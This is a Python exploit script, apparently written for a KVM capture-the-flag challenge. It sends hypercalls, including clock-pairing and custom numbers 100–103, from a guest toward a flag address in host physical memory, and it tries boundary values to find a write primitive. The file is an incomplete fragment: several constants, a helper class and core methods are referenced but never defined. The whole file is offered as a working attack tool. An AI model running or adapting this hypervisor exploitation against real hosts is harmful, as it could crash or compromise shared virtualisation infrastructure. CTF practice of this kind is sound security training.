#!/usr/bin/env python3
"""
KVM CTF Error Handling Exploit v10.1 - CONTROLLED VERSION

Key improvements:
1. Add timeouts to prevent hangs
2. Add rate limiting between potentially dangerous calls
3. Skip known crash-inducing addresses
4. Better exception handling
"""

import os
import sys
import struct
import time
import signal
import argparse
from typing import Optional, List, Tuple
from functools import wraps

# Add timeout decorator
def timeout(seconds=2):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            def handler(signum, frame):
                raise TimeoutError(f"Function {func.__name__} timed out")
            
            # Set timeout
            signal.signal(signal.SIGALRM, handler)
            signal.alarm(seconds)
            
            try:
                result = func(*args, **kwargs)
            finally:
                # Disable alarm
                signal.alarm(0)
            
            return result
        return wrapper
    return decorator

class KVMExploitControlled:
    def __init__(self, verbose: bool = False):
        # ... existing init code ...
        self.crash_avoid_addresses = [
            0x100000000,  # 4GB - caused crash before
            0x0,          # NULL
            0xFFFFFFFFFFFFFFFF,  # Max address
        ]
        
        # Rate limiting between calls
        self.min_call_interval = 0.1  # 100ms between calls
    
    def safe_hypercall(self, nr: int, a0: int = 0, a1: int = 0, a2: int = 0, a3: int = 0, 
                      timeout_sec: int = 3) -> Optional[int]:
        """
        Make hypercall with timeout and error handling
        """
        # Skip known crash addresses
        for addr in [a0, a1, a2, a3]:
            if addr in self.crash_avoid_addresses:
                self.log(f"Skipping hypercall with crash address 0x{addr:x}", "warn")
                return None
        
        # Rate limiting
        time.sleep(self.min_call_interval)
        
        try:
            # Use timeout for potentially dangerous calls
            @timeout(timeout_sec)
            def call():
                return self.hc(nr, a0, a1, a2, a3)
            
            return call()
        except TimeoutError:
            self.log(f"Hypercall {nr} timed out after {timeout_sec}s", "err")
            return None
        except Exception as e:
            self.log(f"Hypercall {nr} error: {e}", "err")
            return None
    
    def exploit_clock_pairing_safe(self):
        """
        Safer version of clock pairing exploit
        """
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} SAFE CLOCK PAIRING EXPLOIT{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        # Start with safe addresses
        safe_addrs = [
            WRITE_FLAG_PHYS,           # Our target
            0x1000,                    # Low valid address
            0x100000,                  # 1MB - should be safe
            0x7FFF0000,                # High but safe 32-bit
        ]
        
        for addr in safe_addrs:
            self.log(f"Trying KVM_HC_CLOCK_PAIRING to 0x{addr:x} (SAFE)", "try")
            
            ret = self.safe_hypercall(KVM_HC_CLOCK_PAIRING, addr, 0, 0, 0)
            if ret is None:
                self.log("  Call failed or timed out", "err")
                continue
            
            self.log(f"  Result: {ret} (0x{ret & 0xffffffffffffffff:x})", "kvm")
            
            # Check flag
            flag = self.check_flag_hc100()
            if flag:
                return flag
        
        # Now try boundary addresses with extra caution
        boundary_tests = [
            (0xFFFFFFFF, "Max 32-bit"),  # Might be okay
            (0x7FFFFFFFFFFFFFFF, "Max positive"),  # Might be okay
        ]
        
        for addr, desc in boundary_tests:
            self.log(f"Trying boundary: 0x{addr:x} ({desc}) - EXTREME CAUTION", "warn")
            
            # Add longer timeout
            ret = self.safe_hypercall(KVM_HC_CLOCK_PAIRING, addr, 0, 0, 0, timeout_sec=5)
            if ret is None:
                self.log(f"  Address 0x{addr:x} caused issues - marking unsafe", "err")
                self.crash_avoid_addresses.append(addr)
                continue
            
            flag = self.check_flag_hc100()
            if flag:
                return flag
        
        return None
    
    def run_safe_all(self):
        """
        Run all exploits with safety measures
        """
        self.log("Starting SAFE exploit sequence", "info")
        
        # First, try safe direct approach
        flag = self.exploit_ctf_semantics_safe()
        if flag:
            return flag
        
        # Then try clock pairing with safety
        flag = self.exploit_clock_pairing_safe()
        if flag:
            return flag
        
        # Other safe exploits...
        exploits = [
            ("Direct Writes (safe)", self.exploit_direct_writes),
            ("CTF Semantics (safe)", self.exploit_ctf_semantics_safe),
            ("Error Fuzzing (safe)", self.exploit_error_fuzzing_safe),
        ]
        
        for name, func in exploits:
            self.log(f"Running: {name}", "info")
            flag = func()
            if flag:
                return flag
        
        return None

    def exploit_ctf_semantics_safe(self):
        """
        Safer version of CTF hypercall testing
        """
        # Test with minimal, safe arguments first
        test_combinations = [
            # (hc, a0, a1) - start with simple values
            (100, WRITE_FLAG_PHYS, 0),
            (101, WRITE_FLAG_PHYS, 1),
            (102, WRITE_FLAG_PHYS, 0),
            (103, WRITE_FLAG_PHYS, 1),
        ]
        
        for hc, a0, a1 in test_combinations:
            self.log(f"Testing HC{hc}(0x{a0:x}, 0x{a1:x})", "try")
            
            ret = self.safe_hypercall(hc, a0, a1, 0, 0)
            if ret is None:
                continue
            
            # Check for flag pattern in return
            if ret != 0 and ret != 0xffffffffffffffff:
                b = struct.pack('<Q', ret)
                for pattern in FLAG_PATTERNS:
                    if pattern in b:
                        text = b.rstrip(b'\x00').decode('ascii', errors='ignore')
                        self.log(f"FLAG in HC{hc} return: {text}", "flag")
                        return text
            
            # Also check HC#100 after each call
            flag = self.check_flag_hc100_safe()
            if flag:
                return flag
        
        return None

    def check_flag_hc100_safe(self):
        """
        Safer version of flag check
        """
        try:
            @timeout(2)
            def check():
                return self.check_flag_hc100()
            return check()
        except TimeoutError:
            return None
        except Exception:
            return None

# Main execution with recovery
def main_safe():
    parser = argparse.ArgumentParser(description='Safe KVM CTF Exploit')
    parser.add_argument('--safe', action='store_true', help='Use safe mode')
    parser.add_argument('--interval', type=float, default=0.1, help='Min call interval')
    parser.add_argument('--timeout', type=int, default=3, help='Call timeout')
    args = parser.parse_args()
    
    exploit = KVMExploitControlled(verbose=True)
    
    if not exploit.probe:
        print(f"{C.R}[-]{C.E} Failed to initialize")
        return
    
    try:
        # Set parameters
        exploit.min_call_interval = args.interval
        
        print(f"{C.G}[+]{C.E} Starting in SAFE mode")
        print(f"{C.G}[+]{C.E} Min interval: {args.interval}s")
        print(f"{C.G}[+]{C.E} Timeout: {args.timeout}s")
        
        flag = exploit.run_safe_all()
        
        if flag:
            print(f"\n{C.G}{'='*70}{C.E}")
            print(f"{C.G}{C.BOLD} SUCCESS: {flag}{C.E}")
            print(f"{C.G}{'='*70}{C.E}")
        else:
            print(f"\n{C.Y}{'='*70}{C.E}")
            print(f"{C.Y} No flag found in safe mode{C.E}")
            print(f"{C.Y} Try more aggressive approach with caution{C.E}")
            print(f"{C.Y}{'='*70}{C.E}")
    
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!]{C.E} Interrupted by user")
    except Exception as e:
        print(f"\n{C.R}[!]{C.E} Critical error: {e}")
    finally:
        exploit.close()

if __name__ == '__main__':
    # Use signal handling for timeouts
    signal.signal(signal.SIGALRM, lambda sig, frame: None)
    
    try:
        main_safe()
    except Exception as e:
        print(f"Fatal: {e}")
